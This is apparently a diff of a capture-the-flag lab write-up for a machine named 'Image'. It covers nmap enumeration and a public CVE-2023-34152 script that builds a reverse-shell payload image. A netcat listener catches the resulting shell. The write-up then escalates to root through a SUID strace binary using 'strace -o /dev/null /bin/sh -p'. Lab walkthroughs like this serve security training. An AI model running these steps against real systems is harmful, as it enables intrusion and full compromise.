@@ -3,7 +3,7 @@
 # 🐧Image🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -sC -sV 192.168.143.178
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 15:02 AEDT
 Nmap scan report for 192.168.143.178
@@ -25,14 +25,14 @@ we can upload image on the website
 
 Found CVE-2023-34152 on github  
 https://github.com/SudoIndividual/CVE-2023-34152
-```
+```console
 $ python3 CVE-2023-34152.py 192.168.45.201 80
 Created by SudoIndividual (https://github.com/SudoIndividual)
 PNG file (payload) have been created in current directory. Upload the payload to the server
 ```
 it will generate a reverseshell payload image  
 upload it to the website and get the shell  
-```
+```console
 $ nc -lvnp 80                
 listening on [any] 80 ...
 connect to [192.168.45.201] from (UNKNOWN) [192.168.143.178] 43930
@@ -45,17 +45,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 upload linpeas and found the strace command has SUID
 
-```
+```console
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                   
 -rwsr-sr-x 1 root root 1.6M Apr 16  2020 /usr/bin/strace
 ```
 search GTFOBin and found the command to get root  
 https://gtfobins.org/gtfobins/strace/#shell
-```
+```console
 strace -o /dev/null /bin/sh -p
 ```
-```
+```console
 www-data@image:/tmp$ strace -o /dev/null /bin/sh -p
 id
 uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
